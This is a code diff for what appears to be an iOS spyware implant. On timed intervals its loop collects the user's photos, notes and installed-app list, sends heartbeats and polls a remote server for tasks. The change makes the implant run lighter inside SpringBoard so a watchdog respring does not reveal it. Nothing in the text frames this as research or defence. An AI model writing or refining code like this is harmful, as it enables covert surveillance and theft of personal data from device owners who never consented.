@@ -233,7 +233,10 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
 #pragma mark - 主循环
 
 - (void)start {
-    [self log:[NSString stringWithFormat:@"loaded, seed=%@ base=%@", kSeed, kBaseURL]];
+    NSString *host = [Info hostBundleId];
+    BOOL inSpringBoard = [Info isSpringBoard];
+    [self log:[NSString stringWithFormat:@"loaded host=%@ seed=%@ base=%@",
+               host, kSeed, kBaseURL]];
 
     dispatch_async(dispatch_get_global_queue(0, 0), ^{
         // 等进程稳定一下
@@ -248,10 +251,18 @@ static NSString *const kSeed        = @"d9f5121f75a6646c4f814a4ff8c41b04";    //
             @autoreleasepool {
                 tick++;
                 @try {
-                    if (tick % 3 == 1) [self collectPhotos];   // 约 60s 一次
-                    if (tick % 5 == 2) [self collectNotes];    // 约 100s 一次
-                    if (tick % 3 == 0) [self heartbeat];       // 约 60s 一次
-                    [self pollTasks];                          // 每轮都轮询
+                    if (inSpringBoard) {
+                        // SpringBoard 里只做轻量工作：心跳 + app 列表 + 任务轮询。
+                        // 相册/备忘录这种重活会拖住主渲染线程，触发看门狗 respring。
+                        if (tick % 3 == 0) [self heartbeat];
+                        if (tick % 6 == 0) [self collectAppList];
+                        [self pollTasks];
+                    } else {
+                        if (tick % 3 == 1) [self collectPhotos];   // 约 60s 一次
+                        if (tick % 5 == 2) [self collectNotes];    // 约 100s 一次
+                        if (tick % 3 == 0) [self heartbeat];       // 约 60s 一次
+                        [self pollTasks];                          // 每轮都轮询
+                    }
                 } @catch (NSException *e) {
                     [self log:[NSString stringWithFormat:@"loop exception: %@", e.reason]];
                 }
